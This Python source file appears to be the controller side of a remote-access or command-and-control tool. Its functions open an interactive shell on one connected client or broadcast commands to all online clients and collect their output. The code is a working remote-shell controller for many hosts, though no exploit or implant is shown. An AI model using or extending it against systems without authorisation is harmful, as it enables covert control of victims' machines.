from prompt_toolkit import PromptSession
from src.utils.net_io import recv, send
from src.ui.colors import Colors as cl
import time
import socket

def stream_shell(client_socket, client_hostname):
    """Streams an interactive shell between server and client"""
    shell_session = PromptSession()
    print(f"{cl.green}[+] Starting shell session...{cl.reset}")
    try:
        while True:
            cmd = shell_session.prompt(f"shell@{client_hostname} $ ")
            if cmd.lower() == "exit":
                send(client_socket, "exit_shell")
                break
            send(client_socket, cmd)
            while True:
                output = recv(client_socket)
                if output.endswith(b"END_OF_OUTPUT"):
                    print(output[:-13].decode(), end="")
                    break
                print(output.decode(), end="")
    except KeyboardInterrupt:
        send(client_socket, "exit_shell")
    except Exception as e:
        print(f"{cl.red}[!] Shell error: {e}{cl.reset}")

def stream_broadcast_shell(clients, cmd):
    """Streams an interactive shell to all connected clients"""
    shell_session = PromptSession()
    print(f"{cl.green}[+] Starting broadcast shell session (type 'exit' to end){cl.reset}")
    try:

        for id, client_info in clients.items():
            if client_info['status'] == "online":
                send(client_info['socket'], cmd)  
                time.sleep(0.5)  

        while True:
            sh_cmd = shell_session.prompt("shell@broadcast $ ").strip()
            
            if sh_cmd.lower() == "exit":
                for id, client_info in clients.items():
                    if client_info['status'] == "online":
                        send(client_info['socket'], "exit_shell")
                break

            for id, client_info in clients.items():
                if client_info['status'] == "online":
                    send(client_info['socket'], sh_cmd)
                    print(f"\n{cl.blue}[{client_info['hostname']}]{cl.reset}")
                    while True:
                        output = recv(client_info['socket'])
                        if output.endswith(b"END_OF_OUTPUT"):
                            print(output[:-13].decode(), end="")
                            break
                        print(output.decode(), end="")
                time.sleep(0.2)

    except KeyboardInterrupt:
        print(f"{cl.yellow}[!] Exiting broadcast shell{cl.reset}")
        for id, client_info in clients.items():
            send(client_info['socket'], "exit_shell")
    except Exception as e:
        print(f"{cl.red}[!] Broadcast shell error: {e}{cl.reset}")
